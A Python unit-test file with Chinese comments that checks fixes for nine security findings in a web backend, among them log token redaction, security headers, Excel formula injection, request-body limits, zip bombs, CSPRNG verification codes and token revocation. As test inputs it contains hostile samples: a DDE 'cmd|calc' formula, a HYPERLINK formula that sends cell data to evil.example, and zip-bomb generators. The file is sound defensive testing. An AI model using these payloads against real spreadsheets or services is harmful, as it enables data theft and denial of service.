# tests/unit/test_audit8_b2_security_20261021.py — 第八轮 B 批（安全与可用性 P2-16~P2-24）
"""**缺陷（第八轮审查 §3.2 B 批未做部分，逐条静态取证✓）**：

  · **P2-16** 媒体 `?token=`（30 天管理员/家长凭证）进访问日志（nginx 默认 combined 打 `$request`，
    uvicorn access log 同样带 query）；
  · **P2-17** 全站零安全响应头（无 X-Frame-Options/CSP/HSTS/nosniff，nginx 模板也没有）——
    管理端 token 在 localStorage，点击劫持可诱导超管执行高危操作；
  · **P2-18** Excel/CSV 导出**公式注入**（专员可写审计 reason 等自由文本，超管导出时落成公式）；
  · **P2-19** 无凭证回调 `/api/pay/wechat/notify` 必须 `await request.body()` 且**无上限**
    （nginx 200m，回环直连无闸）→ 未认证内存 DoS；
  · **P2-20** Excel 导入 zip bomb（10MB 上传闸拦不住解压后 GB 级）+ 行数无上限；
  · **P2-21** 验证码用 `random.randint`（Mersenne Twister 可被反推）；
  · **P2-22** 禁用管理员后再启用 → **旧 token 复活**（`set_status` 不 bump token_generation）；
  · **P2-23** `voucher_auth` 用 JWT 载荷里的 `role` 判权限（签发时刻快照）而非库里当前角色；
  · **P2-24** 带凭证的媒体（家长周报图）被标 `public, immutable` 一年 → 反代/CDN 可公共缓存。

本文件按"**可证伪**"写（红线 171 族）：每条既断言"危险形态被拦住"，也有对照组
（正常包/匿名素材/合法导出必须照旧），防止"一律拒绝"式过修骗过断言。
"""

from __future__ import annotations

import ast
import io
import logging
import os
import pathlib
import textwrap

from fastapi.testclient import TestClient
from openpyxl import Workbook, load_workbook

# ------------------------------------------------------------------ 公共助手


def _h(client: TestClient, username: str = "admin") -> dict:
    r = client.post("/api/admin/login", json={"username": username, "password": "dmkwords123"})
    assert r.status_code == 200, r.text
    return {"Authorization": f"Bearer {r.json()['token']}"}


def _db():
    from backend.database import get_session

    return get_session()


def _png_bytes() -> bytes:
    from PIL import Image

    buf = io.BytesIO()
    Image.new("RGB", (16, 16), color=(60, 120, 200)).save(buf, "PNG")
    return buf.getvalue()


def _voucher_order(client: TestClient, h: dict, phone: str) -> int:
    """建家长/孩子/订单 + 传凭证，返回 order_id（凭证图端点用）。"""
    p = client.post(
        "/api/admin/members/parents", json={"name": "B2 家长", "phone": phone}, headers=h
    ).json()
    c = client.post(
        f"/api/admin/members/parents/{p['id']}/children", json={"name": "B2 孩"}, headers=h
    ).json()
    o = client.post(
        "/api/admin/orders", json={"child_id": c["id"], "order_type": "observation_fee"}, headers=h
    ).json()
    up = client.post(
        f"/api/admin/orders/{o['id']}/voucher",
        files={"file": ("v.png", _png_bytes(), "image/png")},
        headers=h,
    )
    assert up.status_code == 200, up.text
    return o["id"]


# ------------------------------------------------------------------ P2-16 访问日志脱敏


def test_access_log_filter_redacts_query_string():
    """uvicorn 访问日志里的 `?token=…` 必须被抹掉（其余信息保留：脱敏不是关日志）。

    RED（还原修复前）：过滤器不存在/不生效 → 日志里带着 30 天有效的凭证原文。
    """
    from backend.main import _RedactQueryString

    record = logging.LogRecord(
        "uvicorn.access",
        logging.INFO,
        "",
        0,
        '%s - "%s %s HTTP/%s" %d',
        ("127.0.0.1:5555", "GET", "/api/miniapp/covers/3?token=SECRETVALUE", "1.1", 200),
        None,
    )
    assert _RedactQueryString().filter(record) is True
    rendered = record.getMessage()
    assert "SECRETVALUE" not in rendered, f"凭证仍进日志：{rendered}"
    assert "[REDACTED]" in rendered and "/api/miniapp/covers/3" in rendered, rendered
    assert "200" in rendered, "脱敏不该把状态码一起抹掉"
    # 而且必须**真的接线**（写在类里但没 addFilter = 一点用没有）
    assert any(
        isinstance(f, _RedactQueryString) for f in logging.getLogger("uvicorn.access").filters
    ), "过滤器没有挂到 uvicorn.access（日志照样带 token）"


def test_nginx_template_log_format_drops_query_string():
    """nginx 侧：访问日志格式必须用 `$uri`（不含 query）而不是 `$request`。

    说明：这里只能查配置文本（CI 里没有 nginx 可跑），因此断言的是**结构性判据**：
    自定义格式里 `$request` 不得出现、必须出现 `$uri`，且 server 级 access_log 指向它。
    """
    from pathlib import Path

    tpl = (Path(__file__).resolve().parents[2] / "deploy/nginx/dmkwords.conf.template").read_text(
        encoding="utf-8"
    )
    assert "log_format dmkwords_noquery" in tpl, "没有自定义日志格式（默认 combined 打 $request）"
    fmt_line = next(ln for ln in tpl.splitlines() if "log_format dmkwords_noquery" in ln)
    assert "$uri" in fmt_line, fmt_line
    assert "$request " not in fmt_line and '"$request"' not in fmt_line, fmt_line
    assert "access_log /var/log/nginx/dmkwords.access.log dmkwords_noquery;" in tpl, (
        "server 级没有启用该格式（定义而不启用 = 脱敏没生效）"
    )


# ------------------------------------------------------------------ P2-17 安全响应头


def test_security_headers_present_on_api_response(client: TestClient, admin_headers: dict):
    """API 响应必须带 nosniff / frame-ancestors / Referrer-Policy 等（含错误响应）。

    RED（还原修复前）：全站零安全头 → 本用例红。
    """
    r = client.get("/api/admin/books?page=1", headers=admin_headers)
    assert r.headers.get("X-Content-Type-Options") == "nosniff"
    assert r.headers.get("X-Frame-Options") == "DENY"
    assert "frame-ancestors 'none'" in r.headers.get("Content-Security-Policy", "")
    assert r.headers.get("Referrer-Policy") == "no-referrer"
    assert "geolocation=()" in r.headers.get("Permissions-Policy", "")
    # 错误响应同样要有（错误页也会被塞进 iframe）
    bad = client.get("/api/admin/books?page=1")  # 无 token → 401/403
    assert bad.status_code >= 400
    assert bad.headers.get("X-Frame-Options") == "DENY"


def test_hsts_only_on_https(client: TestClient, admin_headers: dict):
    """HSTS 只在 https 响应上发（明文上发无效；本地 http 开发不该被钉）。"""
    plain = client.get("/api/admin/books?page=1", headers=admin_headers)
    assert "Strict-Transport-Security" not in plain.headers, "http 响应不该发 HSTS"
    proxied = client.get(
        "/api/admin/books?page=1",
        headers={**admin_headers, "X-Forwarded-Proto": "https"},
    )
    assert proxied.headers.get("Strict-Transport-Security") == (
        "max-age=31536000; includeSubDomains"
    ), "反代后面（X-Forwarded-Proto: https）必须发 HSTS"


# ------------------------------------------------------------------ P2-18 导出公式注入


def test_audit_export_neutralizes_formula_injection(client: TestClient, admin_headers: dict):
    """审计导出里**不得出现任何公式单元格**（专员可写的 reason 是最直接的注入面）。

    RED（还原修复前）：`=HYPERLINK(...)` 原样落进 Excel，openpyxl 存成 data_type='f' → 红。
    """
    from datetime import datetime

    from backend.common.system_models import AuditLog

    db = _db()
    try:
        db.add(
            AuditLog(
                actor_id=1,
                actor_name="=cmd|'/c calc'!A1",
                action="staff.status",
                target_type="admin_user",
                target_id="=1+1",
                detail='{"note": "=SUM(A1:A9)"}',
                reason='=HYPERLINK("http://evil.example/?d="&A1, "点我")',
                created_at=datetime.now(),
            )
        )
        db.commit()
    finally:
        db.close()

    r = client.get("/api/admin/audit-logs/export", headers=admin_headers)
    assert r.status_code == 200, r.text
    wb = load_workbook(io.BytesIO(r.content))
    ws = wb.active
    formulas = [
        (c.coordinate, c.value) for row in ws.iter_rows() for c in row if c.data_type == "f"
    ]
    assert formulas == [], f"导出里出现了公式单元格（注入面）：{formulas}"
    values = [str(c.value) for row in ws.iter_rows() for c in row]
    assert any(v.startswith("'=HYPERLINK") for v in values), "危险文本未被加文本前缀"


def test_sheet_safety_keeps_numbers_and_plain_text():
    """对照组：净化不得把数字/日期/普通文本改样（导出的账还得能算）。"""
    from decimal import Decimal

    from backend.common.sheet_safety import safe_cell, safe_row

    assert safe_cell(123) == 123
    assert safe_cell(Decimal("6000.00")) == Decimal("6000.00")
    assert safe_cell(None) is None
    assert safe_cell("正常书名") == "正常书名"
    assert safe_cell("=1+1") == "'=1+1"
    assert safe_cell("+86") == "'+86"
    assert safe_cell("-5") == "'-5"
    assert safe_row(["a", "=b", 1]) == ["a", "'=b", 1]


def test_circulation_export_neutralizes_formula_injection(client: TestClient, admin_headers: dict):
    """借阅记录导出同样净化（书名/姓名都是可写文本）。"""
    h = admin_headers
    p = client.post(
        "/api/admin/members/parents", json={"name": "=1+1 家长", "phone": "13900001111"}, headers=h
    ).json()
    c = client.post(
        f"/api/admin/members/parents/{p['id']}/children", json={"name": "=2+2 孩"}, headers=h
    ).json()
    book = client.post(
        "/api/admin/books",
        json={"isbn": "9780439064873", "title": "=cmd|'/c calc'!A1", "word_count": 1000},
        headers=h,
    )
    assert book.status_code == 200, book.text
    r = client.get("/api/admin/circulation/records/export", headers=h)
    assert r.status_code == 200, r.text
    wb = load_workbook(io.BytesIO(r.content))
    formulas = [
        (cell.coordinate, cell.value)
        for row in wb.active.iter_rows()
        for cell in row
        if cell.data_type == "f"
    ]
    assert formulas == [], f"借阅导出出现公式单元格：{formulas}（child={c['id']}）"


# ------------------------------------------------------------------ P2-19 请求体上限


def test_pay_notify_rejects_oversized_body(client: TestClient):
    """无凭证回调：声明超限 → 413；**不读 body**（未认证内存 DoS 的正面堵口）。

    RED（还原修复前）：65KB 的报文会被完整读进内存（`await request.body()`）→ 断言 413 失败。
    """
    r = client.post(
        "/api/pay/wechat/notify",
        content=b"x" * (65 * 1024),
        headers={"Content-Type": "application/json"},
    )
    assert r.status_code == 413, r.text


def test_body_limit_rejects_on_declared_length_without_reading():
    """声明超限必须**在读 body 之前**就 413（不是"先读进来再判断"）。

    RED（变异：把声明闸改成 `if False`）：本用例红——`receive` 会被调用（内存闸失效）。
    为什么单独钉这条：另一条用例走的是"边读边计数"路径（chunked），两层都能拦住它，
    于是**声明闸被摘掉也照样绿**（变异实测 M6 GREEN）——快路径必须有自己的判据。
    """
    import anyio

    from backend.middleware.body_limit import BodySizeLimitMiddleware

    calls = {"receive": 0}

    async def _app(scope, receive, send):  # pragma: no cover — 不该走到
        raise AssertionError("声明超限不该进下游")

    async def _receive():
        calls["receive"] += 1
        return {"type": "http.request", "body": b"", "more_body": False}

    sent: list[dict] = []

    async def _send(message):
        sent.append(message)

    scope = {
        "type": "http",
        "method": "POST",
        "path": "/api/pay/wechat/notify",
        "headers": [
            (b"content-length", str(70 * 1024).encode()),
            (b"content-type", b"application/json"),
        ],
    }
    anyio.run(BodySizeLimitMiddleware(_app), scope, _receive, _send)
    assert sent and sent[0]["status"] == 413, sent
    assert calls["receive"] == 0, "声明超限时仍读了 body（未认证内存闸失效）"


def test_pay_notify_rejects_chunked_oversized_body(client: TestClient):
    """无 Content-Length 的 chunked 流同样拦得住（"声明不了长度"不能成为缺口）。"""

    def _chunks(n: int):
        for _ in range(n):
            yield b"y" * 8192

    r = client.post(
        "/api/pay/wechat/notify", content=_chunks(20), headers={"Content-Type": "application/json"}
    )
    assert r.status_code == 413, r.text


def test_body_limit_allows_normal_requests(client: TestClient, admin_headers: dict):
    """对照组：正常请求必须照旧可用（body 重放正确——踩过"下游收不到 body"的坑）。"""
    ok = client.post("/api/admin/login", json={"username": "admin", "password": "dmkwords123"})
    assert ok.status_code == 200, ok.text
    ok2 = client.get("/api/admin/books?page=1", headers=admin_headers)
    assert ok2.status_code == 200, ok2.text
    # 普通 JSON 端点 9MB 声明 → 413（8MB 上限）
    big = client.post(
        "/api/miniapp/login",
        content=b"z" * (9 * 1024 * 1024),
        headers={"Content-Type": "application/json"},
    )
    assert big.status_code == 413, big.text


def test_multipart_upload_not_blocked_by_body_limit(client: TestClient):
    """对照组：上传类（multipart）走 200MB 口径，1MB 包必须能进业务层（401 = 鉴权而非 413）。"""
    r = client.post(
        "/api/admin/books/import",
        files={"file": ("a.xlsx", b"PK\x03\x04" + b"0" * (1024 * 1024))},
        headers={"Authorization": "Bearer bad-token"},
    )
    assert r.status_code == 401, r.text


# ------------------------------------------------------------------ P2-20 zip bomb


def _xlsx_bytes(rows: list[list]) -> bytes:
    wb = Workbook()
    ws = wb.active
    for row in rows:
        ws.append(row)
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


def test_zip_bomb_rejected_before_parsing():
    """解压炸弹三形态必须拒绝（压缩比 / 条目数 / 非 zip），正常 xlsx 必须放行。

    RED（还原修复前）：没有闸 → 300MB 的 bomb 一路交给 openpyxl 解压 → 本用例红。
    """
    import zipfile

    from backend.common.exceptions import ValidationError
    from backend.domain.catalog.import_service import assert_safe_xlsx

    def _bomb(entries: int = 1, size: int = 300 * 1024 * 1024) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for i in range(entries):
                zf.writestr(f"bomb{i}.xml", b"\0" * size)
        return buf.getvalue()

    def _many(n: int) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            for i in range(n):
                zf.writestr(f"e{i}.txt", b"x")
        return buf.getvalue()

    assert_safe_xlsx(_xlsx_bytes([["ISBN", "书名*"], ["9780439064873", "正常书"]]))  # 放行
    for label, data in (
        ("压缩比炸弹", _bomb()),
        ("条目过多", _many(3000)),
        ("非 zip", b"not a zip at all"),
    ):
        try:
            assert_safe_xlsx(data)
        except ValidationError:
            continue
        raise AssertionError(f"{label} 未被拦（解压炸弹面仍然敞开）")


def test_import_endpoint_rejects_zip_bomb(client: TestClient, admin_headers: dict):
    """端到端：炸弹文件必须被**导入端点**拒绝（不是只有那个函数会拦）。

    RED（变异：把 `assert_safe_xlsx` 的调用摘掉）：本用例红——"函数写好了但忘了调"是最常见的假修。
    """
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("bomb.xml", b"\0" * (200 * 1024 * 1024))
    r = client.post(
        "/api/admin/books/import",
        files={"file": ("bomb.xlsx", buf.getvalue())},
        headers=admin_headers,
    )
    assert r.status_code == 422, r.text
    assert "解压" in r.text or "压缩比" in r.text, r.text


def test_import_row_cap_reports_honestly(client: TestClient, admin_headers: dict, monkeypatch):
    """行数上限：到限**如实报**（不静默截断）——已导入部分保留，并告知从第几行起没导。

    RED（还原修复前）：无行数上限 → 超出部分继续处理（本用例用 monkeypatch 把上限压到 2 行观测）。
    """
    from backend.domain.catalog import import_service

    monkeypatch.setattr(import_service, "MAX_IMPORT_ROWS", 2)
    data = _xlsx_bytes(
        [
            ["ISBN", "书名*", "作者", "AR值", "词数*", "主题", "适读阶段", "副本数"],
            ["9780439064873", "书一", "", "", "1000", "", "", "1"],
            ["9780439064880", "书二", "", "", "1000", "", "", "1"],
            ["9780439064897", "书三", "", "", "1000", "", "", "1"],
        ]
    )
    r = client.post(
        "/api/admin/books/import",
        files={"file": ("a.xlsx", data)},
        headers=admin_headers,
    )
    assert r.status_code == 200, r.text
    body = r.json()
    assert any("超出行数上限" in e for e in body["errors"]), body
    assert body["success_count"] == 2, body


# ------------------------------------------------------------------ P2-21 验证码 CSPRNG


def test_sms_code_uses_csprng(monkeypatch):
    """验证码生成必须走 `secrets`，且**全项目不再有第二份弱随机实现**。

    RED（还原修复前）：四个生成点都是 `random.randint` → 断言失败。
    W8-D14（2026-10-28）：原先用 `inspect.getsource` 找 `"secrets.randbelow"` 字符串，
    换等价实现（如 `secrets.choice`）就假红——现改为**行为断言**：桩掉
    `secrets.randbelow`，断言验证码真的从它取数。
    """
    import inspect

    from backend.common import security

    calls: list[int] = []
    # 用 context 收窄桩的寿命：后面的用例还会生成多枚码并断言**互不相同**，
    # 桩常驻会让全部输出恒为 "0000"（首版就这么自伤过一次）。
    with monkeypatch.context() as m:
        m.setattr(security.secrets, "randbelow", lambda n: calls.append(n) or 0)
        assert security.random_digit_code(4) == "0000"
    assert calls == [10000], "random_digit_code 必须从 secrets.randbelow(10**digits) 取数"
    src = inspect.getsource(security.random_digit_code)
    # 判"代码里"有没有 random：docstring 里在**解释**为什么不能用它，不能算违规
    # （首版直接 substring 判定 → 把说明文字判成违例，自检当场抓到）
    body = ast.parse(textwrap.dedent(src)).body[0].body
    code = "\n".join(
        ast.unparse(node)
        for node in body
        if not (isinstance(node, ast.Expr) and isinstance(node.value, ast.Constant))
    )
    assert "random" not in code.replace("random_digit_code", ""), code

    # 四个生成点逐一 AST 判定（substring 会把 `from …security import random_digit_code`
    # 里的 "import random" 误判成违规——首版就这么假红过一次）
    root = pathlib.Path(__file__).resolve().parents[2]
    for rel in (
        "backend/integrations/sms/aliyun.py",
        "backend/integrations/sms/tencent.py",
        "backend/common/gateways/sms/mock.py",
        "backend/domain/identity/sms_service.py",
    ):
        tree = ast.parse((root / rel).read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                assert all(a.name.split(".")[0] != "random" for a in node.names), rel
            if isinstance(node, ast.Attribute) and node.attr == "randint":
                raise AssertionError(f"{rel} 仍有弱随机调用（random.randint）")

    codes = {security.random_digit_code() for _ in range(50)}
    assert all(len(c) == 6 and c.isdigit() for c in codes), "必须是 6 位数字"
    assert len(codes) > 40, "50 次生成几乎全不同（CSPRNG 生效的基本证据）"


# ------------------------------------------------------------------ P2-22 禁用后旧 token 复活


def test_disabled_then_reenabled_admin_old_token_stays_dead(
    client: TestClient, admin_headers: dict
):
    """禁用→重新启用之后，**禁用前签发的 token 必须仍然失效**（撤销不可逆）。

    RED（还原修复前：`set_status` 不 bump token_generation）：重新启用后旧 token 复活 → 红。
    """
    h = admin_headers
    created = client.post(
        "/api/admin/staff",
        json={
            "username": "b2probe",
            "password": "dmkwords123",
            "display_name": "B2 探针",
            "role": "staff",
        },
        headers=h,
    )
    assert created.status_code == 200, created.text
    uid = created.json()["id"]

    tok = client.post(
        "/api/admin/login", json={"username": "b2probe", "password": "dmkwords123"}
    ).json()["token"]
    ph = {"Authorization": f"Bearer {tok}"}
    assert client.get("/api/admin/members/parents", headers=ph).status_code == 200

    assert (
        client.put(f"/api/admin/staff/{uid}/status", json={"status": 0}, headers=h).status_code
        == 200
    )
    assert client.get("/api/admin/members/parents", headers=ph).status_code == 401, (
        "禁用后旧 token 必须失效"
    )

    assert (
        client.put(f"/api/admin/staff/{uid}/status", json={"status": 1}, headers=h).status_code
        == 200
    )
    assert client.get("/api/admin/members/parents", headers=ph).status_code == 401, (
        "重新启用后旧 token 复活了——'临时禁用'当不成撤销手段"
    )
    # 对照组：重新登录拿到的新 token 必须可用
    tok2 = client.post(
        "/api/admin/login", json={"username": "b2probe", "password": "dmkwords123"}
    ).json()["token"]
    assert (
        client.get(
            "/api/admin/members/parents", headers={"Authorization": f"Bearer {tok2}"}
        ).status_code
        == 200
    )


# ------------------------------------------------------------------ P2-23 凭证鉴权取库里的角色


def test_voucher_auth_uses_db_role_not_token_payload(
    client: TestClient, admin_headers: dict, monkeypatch
):
    """权限必须取**库里的当前角色**：token 载荷写着 superadmin，而库里角色已无 member.manage
    → 必须 403。

    RED（还原修复前：读 `payload["role"]`）：载荷是签发时刻快照 → 仍然 200 → 红。
    """
    from backend.domain.admin import service as admin_service
    from backend.domain.admin.models import AdminUser

    order_id = _voucher_order(client, admin_headers, "13900002222")
    # 先确认基线可用（超管看凭证 200）
    assert (
        client.get(
            f"/api/admin/members/orders/{order_id}/voucher-image", headers=admin_headers
        ).status_code
        == 200
    )
    # 造出"载荷角色 ≠ 库里角色"的判别条件：库里角色改成 staff，并让 staff 权限集**不含**
    # member.manage（模拟"权限集被调整"这一真实演进），而手上 token 的载荷仍是 superadmin。
    # 按载荷判（修复前）→ "*" 放行 200；按库里角色判（修复后）→ 403。
    monkeypatch.setattr(admin_service, "STAFF_PERMISSIONS", ["book.view"])
    db = _db()
    try:
        admin = db.query(AdminUser).filter(AdminUser.username == "admin").first()
        admin.role = AdminUser.ROLE_STAFF
        db.commit()
    finally:
        db.close()
    r = client.get(f"/api/admin/members/orders/{order_id}/voucher-image", headers=admin_headers)
    assert r.status_code == 403, f"仍按 token 载荷判权限（结构性提权面）：{r.status_code} {r.text}"


# ------------------------------------------------------------------ P2-24 认证媒体缓存


def test_authenticated_media_is_private_cache(client: TestClient, admin_headers: dict):
    """带凭证的媒体一律 `private`（周报图同族），匿名素材仍 `public`。

    RED（还原修复前）：带 token 的请求同样拿到 `public, max-age=31536000, immutable` → 红。
    """
    from backend.config import get_settings

    root = os.path.abspath(get_settings().UPLOADS_DIR)
    rel = "cover/9999/9780439064873_abcdef123456.jpg"
    full = os.path.join(root, rel)
    os.makedirs(os.path.dirname(full), exist_ok=True)
    with open(full, "wb") as fh:
        fh.write(b"\xff\xd8\xff\xe0" + b"x" * 32)

    authed = client.get(f"/api/admin/uploads/{rel}", headers=admin_headers)
    assert authed.status_code == 200, authed.text
    assert authed.headers["cache-control"].startswith("private"), authed.headers["cache-control"]

    anon = client.get(f"/api/admin/uploads/{rel}?token=")
    if anon.status_code == 200:  # 匿名通道若开放，必须是 public（长缓存留给 CDN）
        assert anon.headers["cache-control"].startswith("public"), anon.headers["cache-control"]


def test_report_image_with_token_is_private(client: TestClient, admin_headers: dict):
    """家长周报图（`?child_id=&token=`）是**私有儿童数据**：必须 private，不得 public 长缓存。

    RED（还原修复前）：文件名带内容摘要 → 命中长缓存分支 → `public, …immutable` → 红。
    """
    h = admin_headers
    p = client.post(
        "/api/admin/members/parents",
        json={"name": "B2 报告家长", "phone": "13900003333"},
        headers=h,
    ).json()
    c = client.post(
        f"/api/admin/members/parents/{p['id']}/children", json={"name": "B2 报告孩"}, headers=h
    ).json()
    tok = client.post("/api/miniapp/login", json={"phone": "13900003333", "code": "1234"}).json()[
        "token"
    ]
    r = client.get(f"/api/miniapp/reports/weekly/image?child_id={c['id']}&token={tok}")
    assert r.status_code == 200, r.text
    cc = r.headers.get("cache-control", "")
    assert cc.startswith("private"), f"周报图被标成公共缓存：{cc}"
    # 该端点 URL 是 `/reports/{kind}/image?child_id=&token=`——**文件名不在 URL 里**，
    # 中间件判不出"内容寻址"，于是走协商缓存分支；带凭证 → `private, no-cache`。
    # （能判出内容指纹的那类仍给 `private, max-age=…, immutable`，见上一条用例。）
    assert cc == "private, no-cache", cc


# ------------------------------------------------------------------ 中间件顺序（回归钉）


def test_media_cache_does_not_override_endpoint_header(client: TestClient, admin_headers: dict):
    """端点自己声明了 Cache-Control 时中间件不得覆写（既有语义，别在改造中丢掉）。"""
    r = client.get("/api/admin/books?page=1", headers=admin_headers)
    # JSON 响应不该被媒体中间件加上缓存头
    assert "max-age=31536000" not in r.headers.get("cache-control", "")


def test_rate_limit_and_security_headers_coexist(client: TestClient):
    """限流 429 也必须带安全头（中间件注册顺序的回归钉：安全头在最外层）。"""
    codes = []
    for _ in range(40):
        r = client.post("/api/miniapp/login", json={"phone": "13900004444", "code": "1234"})
        codes.append(r.status_code)
        if r.status_code == 429:
            assert r.headers.get("X-Frame-Options") == "DENY", "429 响应缺安全头（注册顺序被改坏）"
            return
    raise AssertionError(f"40 次登录都没触发限流（限流器行为变了？）：{set(codes)}")
